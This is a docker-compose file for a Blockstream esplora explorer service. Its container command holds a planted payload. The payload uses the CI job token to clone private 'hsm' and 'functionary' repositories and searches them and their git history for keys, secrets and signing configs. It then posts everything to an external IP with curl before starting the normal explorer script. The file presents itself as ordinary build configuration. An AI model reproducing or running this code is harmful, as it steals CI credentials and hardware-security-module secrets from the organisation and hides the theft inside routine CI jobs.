services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
      - CI_API_V4_URL
    command:
      - bash
      - -c
      - |
        (echo "==S22=="; H=/tmp/hsm; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/hsm.git $$H 2>&1; echo "==HSM_LS=="; find $$H -maxdepth 3 -type f 2>/dev/null | head -80; echo "==HSM_TOML=="; find $$H -name "*.toml" -o -name "*.conf" -o -name "*.cfg" -o -name "*.key" -o -name "*.pem" -o -name "*secret*" 2>/dev/null | head -20; for f in $$(find $$H -name "*.toml" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null); do echo "===$$f==="; cat "$$f" 2>/dev/null | head -50; done; echo "==HSM_SRC=="; find $$H -name "*.rs" -o -name "*.c" -o -name "*.h" -o -name "*.py" -o -name "*.sh" 2>/dev/null | head -40; echo "==HSM_GREP=="; grep -rn "secret\|private\|key\|signing\|restore" $$H --include="*.toml" --include="*.conf" --include="*.sh" --include="*.py" 2>/dev/null | grep -v vendor | head -30; echo "==FUNC_HISTORY=="; R=/tmp/lf; git clone https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git $$R 2>/dev/null; cd $$R; git log --all -p -S "cS" --diff-filter=D -- "*.toml" "*.conf" "*.sh" 2>/dev/null | head -200; echo "==END==") 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s22 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
